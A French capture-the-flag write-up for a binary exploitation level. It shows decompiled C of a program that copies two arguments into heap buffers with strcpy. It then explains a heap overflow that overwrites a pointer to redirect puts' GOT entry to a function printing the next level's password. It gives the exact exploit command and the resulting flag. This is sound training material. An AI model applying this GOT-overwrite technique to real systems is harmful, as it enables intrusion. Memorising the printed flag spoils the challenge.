# Rapport CTF - [Level07]

### Observation :
En arrivant sur le level7 on trouve un exécutable nommé level7.\
Quand nous essayons de le lancer, on se rend compte qu'il prend 2 arguments et écris `~~`, puis return. \
Regardons donc avec gdb ou un decompilateur.

### Explication de Code :
En lançant le binaire dans hex-ray ou ghidra nous obtenons :
```c
//----- (080484F4) --------------------------------------------------------
int m()
{
  time_t v0; // eax

  v0 = time(0);
  return printf("%s - %d\n", c, v0);
}

//----- (08048521) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // eax
  void *v5; // [esp+18h] [ebp-8h]
  void *v6; // [esp+1Ch] [ebp-4h]

  v6 = malloc(8u);
  *(_DWORD *)v6 = 1;
  *((_DWORD *)v6 + 1) = malloc(8u);
  v5 = malloc(8u);
  *(_DWORD *)v5 = 2;
  *((_DWORD *)v5 + 1) = malloc(8u);
  strcpy(*((char **)v6 + 1), argv[1]);
  strcpy(*((char **)v5 + 1), argv[2]);
  v3 = fopen("/home/user/level8/.pass", "r");
  fgets(c, 68, v3);
  puts("~~");
  return 0;
}
```
On peut voir le fichier v3 qui open le `.pass` du level suivant, et une fonction `m()` qui nous permet de printf v3. \
On peut aussi voir des malloc comme dans le level précédant, nous allons donc sûrement devoir faire de même.

### Solution :
Il nous faut donc overflow le premier malloc `v6` sur `v5` avec 20 octets random 16 pour le malloc + 4 pour v5, puis ajouter l'adresse jump de puts (pour jump sur `m()`), ensuite dans la 2eme chaîne de caractères nous n'avons plus qu'à mettre l'adresse de fonction `m()`.

On fait la commande suivante pour obtenir le flag :
```sh
./level7 $(python -c "print ('a'*(16 + 4) + '\x08\x04\x99\x28'[::-1])") $(python -c "print '\x08\x04\x84\xf4'[::-1]")
```

### Resultat :
```sh
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
